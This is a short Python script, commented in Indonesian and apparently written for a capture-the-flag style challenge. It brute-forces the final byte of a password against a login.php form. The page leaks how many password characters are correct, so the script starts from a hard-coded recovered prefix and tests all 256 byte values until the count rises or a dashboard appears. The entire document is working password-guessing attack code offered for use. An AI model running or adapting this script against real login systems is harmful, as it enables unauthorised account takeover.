#!/usr/bin/env python3
import sys, time, requests, re
from bs4 import BeautifulSoup

if len(sys.argv) < 3:
    print("Usage: python3 solp_fullrange.py <base_url> <username>")
    sys.exit(1)

base = sys.argv[1].rstrip('/')
username = sys.argv[2]

# Prefix yang sudah ditemukan
prefix = "YzUnh2ruQix9mBW"

session = requests.Session()

def login_attempt(user, password_bytes):
    url = base + "/login.php"
    # penting: kirim password sebagai bytes -> decode latin1 supaya semua byte bisa lewat form
    data = {
        'username': user,
        'password': password_bytes.decode("latin1", errors="ignore"),
    }
    r = session.post(url, data=data, allow_redirects=True, timeout=10)
    text = r.text
    return text

def parse_correct_count(text):
    m = re.search(r'you got\s+(\d+)\s+characters correct', text, re.IGNORECASE)
    if m:
        return int(m.group(1))
    return None

print("[*] Continuing brute force with full byte range 0–255")
print("[*] Known prefix:", prefix)

found = False
for b in range(0, 256):
    candidate = prefix.encode("latin1") + bytes([b])
    print(f"[.] Trying last byte: {b} -> {repr(candidate)}", end="\r")
    text = login_attempt(username, candidate)

    cnt = parse_correct_count(text)
    if cnt and cnt > len(prefix):
        print(f"\n[+] Found final char (byte {b}): {repr(chr(b))}")
        print("[+] Full password (latin1 repr):", candidate.decode("latin1"))
        found = True
        break

    # Kalau tidak naik count, cek apakah langsung sukses login
    if "Dashboard" in text or "Logout" in text or "Welcome" in text:
        print(f"\n[+] Login success with byte {b}! Password:", candidate.decode("latin1"))
        found = True
        break

    # Debug kalau masih stuck
    if cnt == len(prefix):
        snippet = text.strip().splitlines()[:4]
        print(f"\n[DEBUG byte {b}]:", snippet)

    time.sleep(0.05)

if not found:
    print("\n[-] Could not find the 16th character in range 0–255")
else:
    print("[*] Done.")
